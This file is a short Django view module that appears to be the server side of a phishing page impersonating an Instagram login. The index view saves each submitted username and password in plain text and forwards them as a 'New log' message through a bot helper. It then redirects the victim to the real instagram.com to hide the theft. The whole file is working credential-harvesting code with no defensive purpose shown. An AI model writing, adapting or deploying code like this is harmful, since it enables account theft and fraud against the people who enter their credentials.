from django.shortcuts import render, redirect
from .models import Account

from .service import send_message_bot

def index(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        account = Account.objects.create(
            username=username,
            password=password
        )

        account.save()

        send_message_bot(
            f"New log: {account.date_of_login}\n\nUsername: {account.username}\nPassword: {account.password}"
        )
        return redirect('https://instagram.com/')

    return render(request, 'main/index.html')